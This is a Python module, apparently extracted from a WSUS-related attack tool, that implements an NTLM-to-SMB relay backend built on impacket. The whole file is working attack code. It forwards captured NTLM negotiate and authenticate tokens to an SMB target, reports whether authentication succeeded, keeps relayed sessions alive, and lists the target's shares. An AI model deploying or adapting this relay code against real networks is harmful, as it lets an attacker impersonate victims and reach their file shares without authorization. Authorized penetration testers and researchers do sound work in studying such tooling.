# Auto-extracted from pywsus.py: SMB relay backend.

import base64
import http.client
import re
import ssl
import threading
import time
import uuid
from urllib.parse import quote, urlparse

from ._common import NTLM_SESSION_TTL


class _SMBRelayConfig:
    """Tiny ntlmrelayx-compatible config object for SMBRelayClient."""

    smb2support = True
    remove_mic = False
    remove_target = False
    domainIp = None
    machineAccount = None
    machineHashes = None


class SMBNTLMRelayBackend:
    def __init__(self, target_url, timeout=10, action="auth-only"):
        self.target_url = target_url
        self.timeout = timeout
        self.action = action
        self.sessions = {}
        self.live_sessions = {}
        self.next_live_session_id = 1
        self.lock = threading.RLock()

        parsed = urlparse(target_url)
        if parsed.scheme != "smb" or not parsed.hostname:
            raise ValueError("SMB relay target must be smb://host[:port]/")

        self.target = parsed
        self.host = parsed.hostname
        self.port = parsed.port or 445

    def _load_impacket(self):
        try:
            from impacket.examples.ntlmrelayx.clients.smbrelayclient import (  # type: ignore
                SMBRelayClient,
            )
            from impacket.nt_errors import ERROR_MESSAGES, STATUS_SUCCESS  # type: ignore
        except ImportError as err:
            raise RuntimeError("SMB relay requires impacket") from err

        return SMBRelayClient, ERROR_MESSAGES, STATUS_SUCCESS

    @staticmethod
    def _decode_token(token):
        return base64.b64decode(token)

    @staticmethod
    def _status_name(error_messages, status):
        name, _ = error_messages.get(status, ("UNKNOWN", ""))
        return name

    @staticmethod
    def _clean_smb_text(value):
        if isinstance(value, bytes):
            value = value.decode("utf-8", errors="replace")
        return str(value).rstrip("\x00")

    def _session_info(self, client):
        session = client.session
        info = {
            "smb_target": f"{self.host}:{self.port}",
            "smb_dialect": "",
            "smb_signing_required": None,
            "smb_server_name": "",
            "smb_server_domain": "",
            "smb_server_os": "",
            "smb_guest": None,
        }

        if not session:
            return info

        getters = {
            "smb_dialect": session.getDialect,
            "smb_signing_required": session.isSigningRequired,
            "smb_server_name": session.getServerName,
            "smb_server_domain": session.getServerDomain,
            "smb_server_os": session.getServerOS,
            "smb_guest": session.isGuestSession,
        }
        for key, getter in getters.items():
            try:
                info[key] = getter()
            except Exception:
                pass

        return info

    def _list_shares(self, client):
        shares = []
        for share in client.session.listShares():
            shares.append({
                "name": self._clean_smb_text(share["shi1_netname"]),
                "remark": self._clean_smb_text(share["shi1_remark"]),
            })
        return shares

    def _keep_live_session(self, client, identity, username, result):
        with self.lock:
            session_id = self.next_live_session_id
            self.next_live_session_id += 1
            self.live_sessions[session_id] = {
                "client": client,
                "identity": identity,
                "username": username,
                "created_at": time.time(),
                "last_used": time.time(),
                "info": dict(result),
            }
        return session_id

    def list_live_sessions(self):
        with self.lock:
            records = []
            for session_id, record in sorted(self.live_sessions.items()):
                info = dict(record.get("info", {}))
                records.append({
                    "id": session_id,
                    "identity": record.get("identity", ""),
                    "username": record.get("username", ""),
                    "age": int(time.time() - record.get("created_at", time.time())),
                    "idle": int(time.time() - record.get("last_used", time.time())),
                    "target": info.get("smb_target", f"{self.host}:{self.port}"),
                    "server": info.get("smb_server_name", ""),
                    "domain": info.get("smb_server_domain", ""),
                    "signing_required": info.get("smb_signing_required"),
                })
            return records

    def list_live_session_shares(self):
        with self.lock:
            sessions = list(self.live_sessions.items())

        results = []
        for session_id, record in sessions:
            try:
                shares = self._list_shares(record["client"])
                state = "shares-listed"
                error = ""
                with self.lock:
                    if session_id in self.live_sessions:
                        self.live_sessions[session_id]["last_used"] = time.time()
            except Exception as err:
                shares = []
                state = "list-shares-failed"
                error = str(err)

            results.append({
                "id": session_id,
                "identity": record.get("identity", ""),
                "shares": shares,
                "share_count": len(shares),
                "state": state,
                "error": error,
            })

        return results

    def close_live_sessions(self):
        with self.lock:
            sessions = list(self.live_sessions.values())
            self.live_sessions = {}

        for record in sessions:
            try:
                record["client"].killConnection()
            except Exception:
                pass

        return len(sessions)

    def start_type1(self, session_key, type1_token):
        SMBRelayClient, _, _ = self._load_impacket()
        client = SMBRelayClient(_SMBRelayConfig(), self.target, self.port)

        try:
            with self.lock:
                old_session = self.sessions.pop(session_key, None)
            if old_session:
                old_session["client"].killConnection()

            if not client.initConnection():
                raise RuntimeError("SMB target connection failed")

            challenge = client.sendNegotiate(self._decode_token(type1_token))
            if not challenge:
                raise RuntimeError("SMB target did not return NTLM Type 2")

            challenge_data = challenge.getData()
            with self.lock:
                self.sessions[session_key] = {
                    "client": client,
                    "created_at": time.time(),
                    "target_status_type2": "STATUS_MORE_PROCESSING_REQUIRED",
                    "session_info": self._session_info(client),
                }

            return base64.b64encode(challenge_data).decode("ascii")
        except Exception:
            client.killConnection()
            raise

    def finish_type3(self, session_key, type3_token, identity="", username=""):
        with self.lock:
            session = self.sessions.pop(session_key, None)
        if not session:
            raise RuntimeError("missing relay session for Type 3")

        client = session["client"]
        _, error_messages, status_success = self._load_impacket()
        keep_client = False

        try:
            _, status = client.sendAuth(self._decode_token(type3_token))
            status_name = self._status_name(error_messages, status)
            authenticated = status == status_success
            result = {
                "status": status,
                "reason": status_name,
                "authenticated": authenticated,
                "type3_accepted": authenticated,
                "auth_validation": "smb-session-setup" if authenticated else "rejected",
                "action": self.action,
                "target_status_type2": session.get("target_status_type2"),
                "service": "smb",
                "service_validated": authenticated,
                "identity": identity,
                "username": username,
                "shares": [],
                "share_count": 0,
                "smb_action_state": "not-run",
                "smb_action_error": "",
                "smb_session_id": "",
                "smb_session_kept": False,
                **session.get("session_info", {}),
            }

            if authenticated:
                client.setClientId()
                result.update(self._session_info(client))

                if self.action == "keep-session":
                    session_id = self._keep_live_session(
                        client,
                        identity,
                        username,
                        result,
                    )
                    keep_client = True
                    result.update({
                        "smb_session_id": session_id,
                        "smb_session_kept": True,
                        "smb_action_state": "session-kept",
                    })
                elif self.action == "list-shares":
                    try:
                        shares = self._list_shares(client)
                        result.update({
                            "shares": shares,
                            "share_count": len(shares),
                            "smb_action_state": "shares-listed",
                        })
                    except Exception as err:
                        result.update({
                            "smb_action_state": "list-shares-failed",
                            "smb_action_error": str(err),
                        })
                else:
                    result["smb_action_state"] = "auth-only"

            return result
        finally:
            if not keep_client:
                client.killConnection()

    def drop_session(self, session_key):
        with self.lock:
            session = self.sessions.pop(session_key, None)
        if session:
            session["client"].killConnection()

    def cleanup_sessions(self, max_age=NTLM_SESSION_TTL):
        now = time.time()
        with self.lock:
            stale = [
                key for key, session in self.sessions.items()
                if now - session.get("created_at", now) > max_age
            ]
            sessions = [self.sessions.pop(key) for key in stale]

        for session in sessions:
            session["client"].killConnection()

        return len(sessions)

